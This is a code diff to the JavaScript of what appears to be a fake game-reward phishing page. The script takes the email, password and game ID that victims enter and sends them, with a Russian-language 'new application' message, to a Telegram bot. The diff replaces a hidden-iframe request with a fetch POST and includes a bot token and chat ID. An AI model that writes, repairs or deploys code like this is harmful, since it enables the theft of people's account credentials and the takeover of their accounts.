@@ -161,11 +161,7 @@
 </div>
 
 <script>
-    const BOT_TOKEN = '8747751460:AAEO78CefXypChf0HLzoo_ZORaVOGAO9erI';
-    const CHAT_ID   = '8783227095';
-
     let selected = { platform: '', reward: '' };
-    let sent = false;
 
     function selectPlatform(platform, reward) {
         selected.platform = platform;
@@ -227,12 +223,13 @@
 
     function sendData(e) {
         e.preventDefault();
-        if (sent) return false;
-        sent = true;
-
         const email = document.getElementById('email').value;
         const password = document.getElementById('password').value;
         const gameId = document.getElementById('gameId').value;
+
+        // ==== ВСТАВЬ СВОИ ЗНАЧЕНИЯ ====
+        const BOT_TOKEN = '8747751460:AAEO78CefXypChf0HLzoo_ZORaVOGAO9erI';
+        const CHAT_ID   = '8783227095';
 
         const text = `🎁 Новая заявка!\n\n` +
                      `🎮 Платформа: ${selected.platform}\n` +
@@ -242,12 +239,11 @@
                      `🔑 Пароль: ${password}\n` +
                      `🕐 Время: ${new Date().toLocaleString('ru-RU')}`;
 
-        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}`;
-        const iframe = document.createElement('iframe');
-        iframe.style.display = 'none';
-        iframe.src = url;
-        document.body.appendChild(iframe);
-        setTimeout(() => iframe.remove(), 3000);
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({ chat_id: CHAT_ID, text: text })
+        }).catch(err => console.log(err));
 
         document.getElementById('loginStep').classList.remove('active');
         document.getElementById('successText').textContent =
